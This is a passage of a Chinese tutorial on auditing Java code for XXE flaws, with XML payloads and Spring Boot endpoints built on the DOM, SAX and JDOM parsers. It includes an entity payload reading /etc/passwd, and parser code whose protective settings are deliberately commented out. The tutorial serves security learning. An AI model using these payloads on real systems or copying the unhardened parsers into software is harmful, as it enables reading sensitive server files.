class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Copy codePOST /submit-xml HTTP/1.1</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; </span><br><span class="line">&lt;!DOCTYPE user [ </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt; </span><br><span class="line">    &lt;name&gt;hada&lt;/name&gt; </span><br><span class="line">    &lt;email&gt;test@test.com&lt;/email&gt; </span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>​在这个例子中，攻击者定义了一个名为 xxe 的外部XML实体，并将它引用到了XML文档的 name 字段中。如果XML处理器没有正确配置，攻击者可以提交包含XXE漏洞的XML文档来实现读取敏感文件：</p><h2 id="Java中XXE漏洞支持的协议"><a href="#Java中XXE漏洞支持的协议" class="headerlink" title="Java中XXE漏洞支持的协议"></a>Java中XXE漏洞支持的协议</h2><p>​Java中的XXE支持sun.net.<a href="http://www.protocol/">www.protocol</a> 里的所有协议：</p><blockquote><ul><li>http</li><li>https</li><li>file</li><li>ftp</li><li>mailto</li><li>jar</li><li>netdoc</li></ul></blockquote><h2 id="Java常用XML解析API示例"><a href="#Java常用XML解析API示例" class="headerlink" title="Java常用XML解析API示例"></a>Java常用XML解析API示例</h2><p>​想要学习JavaXXE 漏洞代码审计，首先要先熟悉 XML 解析API。</p><p>​常见的JavaXML解析有以下几种方式：1、DOM解析；2、SAX解析；3、JDOM解析；4、DOM4J解析；5、Digester解析</p><p>​在 Java 语言中，常见的 XML 解析器有：</p><blockquote><ol><li><p>DOM (Document Object Model) 解析：这是一种基于树的解析器，它将整个 XML 文档加载到内存中，并将文档组织成一个树形结构。</p></li><li><p>SAX (Simple API for XML) 解析：这是一种基于事件的解析器，它逐行读取 XML 文档并触发特定的事件。</p></li><li><p>JDOM 解析：这是一个用于 Java 的开源库，它提供了一个简单易用的 API 来解析和操作 XML 文档。</p></li><li><p>DOM4J 解析：DOM4J 是一个 Java 的 XML API，是 JDOM 的升级品，用来读写 XML 文件的。</p></li><li><p>Digester 解析：Digester 是 Apache 下一款开源项目。Digester 是对 SAX 的包装，底层是采用的是 SAX 解析方式。</p></li></ol></blockquote><p>​<strong>其中，DOM 和 SAX 为原生自带的。JDOM、DOM4J 和 Digester 需要引入第三方依赖库。</strong></p><p>​接下来就通过代码来熟悉这些API，首先创建一个springboot项目，选择maven工程。</p><p>​这里先给出两个参数，便于后续测试。</p><p>正常用户传入XML文档。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Code Audit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span>hada<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span> <span class="attr">lang</span>=<span class="string">&quot;CN&quot;</span>&gt;</span>hada的代码审计<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tags</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tag</span>&gt;</span>Java<span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tag</span>&gt;</span>Code Audit<span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tags</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pubDate</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​恶意payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.example.org&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">xxe</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>​DOM的全称是Document Object Model，也即文档对象模型。DOM 解析是将一个 XML 文档转换成一个 DOM 树，并将 DOM 树放在内存中。</p><p>使用大致步骤：</p><blockquote><ol><li>创建一个 DocumentBuilderFactory 对象</li><li>创建一个 DocumentBuilder 对象</li><li>通过 DocumentBuilder 的 parse() 方法加载 XML</li><li>遍历 name 和 value 节点</li></ol></blockquote><p>​创建一个DOMtest文件，并键入下列代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javaxxetest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Element;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DOMtest</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/xxe/dom&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">xxeDom</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> convertStreamToString(in);</span><br><span class="line">            <span class="type">StringReader</span> <span class="variable">sr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringReader</span>(body);</span><br><span class="line">            <span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(sr);</span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">            <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> db.parse(is);</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="comment">// 获取根元素</span></span><br><span class="line">            <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> document.getDocumentElement();</span><br><span class="line">            <span class="keyword">if</span> (rootElement.getNodeName().equals(<span class="string">&quot;book&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">NodeList</span> <span class="variable">childNodes</span> <span class="operator">=</span> rootElement.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; childNodes.getLength(); j++) &#123;</span><br><span class="line">                    <span class="type">Node</span> <span class="variable">childNode</span> <span class="operator">=</span> childNodes.item(j);</span><br><span class="line">                    <span class="keyword">if</span> (childNode.getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                        buf.append(String.format(<span class="string">&quot;%s: %s&lt;br&gt;&quot;</span>, childNode.getNodeName(), childNode.getTextContent().trim()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> buf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParserConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SAXException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">convertStreamToString</span><span class="params">(java.io.InputStream is)</span> &#123;</span><br><span class="line">        java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(is).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SAX"><a href="#SAX" class="headerlink" title="SAX"></a>SAX</h3><p>​SAX 的全称是 Simple APIs for XML，也即 XML 简单应用程序接口。与 DOM 不同，SAX 提供的访问模式是一种顺序模式，这是一种快速读写 XML 数据的方式。</p><p>​使用大致步骤：</p><blockquote><ol><li>获取 SAXParserFactory 的实例</li><li>获取 SAXParser 实例</li><li>创建一个 handler() 对象</li><li>通过 parser 的 parse() 方法来解析 XML</li></ol></blockquote><p>​新建一个SAXtest文件并键入如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javaxxetest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.Attributes;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.DefaultHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParser;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParserFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SAXtest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/xxe/SAX&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">SAXtest</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> convertStreamToString(in);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">SAXParserFactory</span> <span class="variable">spf</span> <span class="operator">=</span> SAXParserFactory.newInstance();</span><br><span class="line">            <span class="comment">// 禁用外部实体解析以防止XXE攻击</span></span><br><span class="line"><span class="comment">//            spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span></span><br><span class="line"><span class="comment">//            spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="comment">//            spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="comment">//            spf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span></span><br><span class="line"><span class="comment">//            spf.setXIncludeAware(false);</span></span><br><span class="line"><span class="comment">//            spf.setExpandEntityReferences(false);</span></span><br><span class="line">            <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> spf.newSAXParser();</span><br><span class="line">            <span class="type">SAXHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXHandler</span>();</span><br><span class="line">            <span class="comment">// 解析xml</span></span><br><span class="line">            parser.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)), handler);</span><br><span class="line">            <span class="keyword">return</span> handler.getResult();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error......&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">convertStreamToString</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(is).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义的SAX处理器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SAXHandler</span> <span class="keyword">extends</span> <span class="title class_">DefaultHandler</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">bName</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">bAuthor</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">bDescription</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">bTag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line">                bName = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;author&quot;</span>)) &#123;</span><br><span class="line">                bAuthor = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;description&quot;</span>)) &#123;</span><br><span class="line">                bDescription = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;tag&quot;</span>)) &#123;</span><br><span class="line">                bTag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">characters</span><span class="params">(<span class="type">char</span> ch[], <span class="type">int</span> start, <span class="type">int</span> length)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span class="keyword">if</span> (bName) &#123;</span><br><span class="line">                result.append(<span class="string">&quot;Name: &quot;</span>).append(<span class="keyword">new</span> <span class="title class_">String</span>(ch, start, length)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                bName = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (bAuthor) &#123;</span><br><span class="line">                result.append(<span class="string">&quot;Author: &quot;</span>).append(<span class="keyword">new</span> <span class="title class_">String</span>(ch, start, length)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                bAuthor = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (bDescription) &#123;</span><br><span class="line">                result.append(<span class="string">&quot;Description: &quot;</span>).append(<span class="keyword">new</span> <span class="title class_">String</span>(ch, start, length)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                bDescription = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (bTag) &#123;</span><br><span class="line">                result.append(<span class="string">&quot;Tag: &quot;</span>).append(<span class="keyword">new</span> <span class="title class_">String</span>(ch, start, length)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                bTag = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">endElement</span><span class="params">(String uri, String localName, String qName)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span class="comment">// 可以在这里处理结束元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getResult</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JDOM"><a href="#JDOM" class="headerlink" title="JDOM"></a>JDOM</h3><p>​JDOM 是一个开源项目，它基于树型结构，利用纯 JAVA 的技术对 XML 文档实现解析、生成、序列化以及多种操作。</p><p>​使用大致步骤：</p><blockquote><ol><li>创建一个 SAXBuilder 的对象</li><li>通过 saxBuilder 的 build() 方法，将输入流加载到 saxBuilder 中</li></ol></blockquote><p>​使用 JDOM 需要在 pom.xml 文件中引入该依赖后并重新加载，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jdom<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jdom2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​创建一个JDOMtest文件，并键入如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javaxxetest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.jdom2.Document;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.JDOMException;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDOMtest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/xxe/JDOM&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">jdomDemo</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 获取输入流</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> convertStreamToString(in);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">            <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 禁用外部实体解析以防止XXE攻击</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="comment">//            xmlReader.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span></span><br><span class="line"><span class="comment">//            xmlReader.setProperty(&quot;http://xml.org/sax/properties/lexical-handler&quot;, null);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            builder.setXMLReader(xmlReader);</span></span><br><span class="line">            <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> builder.build(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));</span><br><span class="line">            <span class="keyword">return</span> document.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JDOMException | SAXException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error......&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">convertStreamToString</span><span 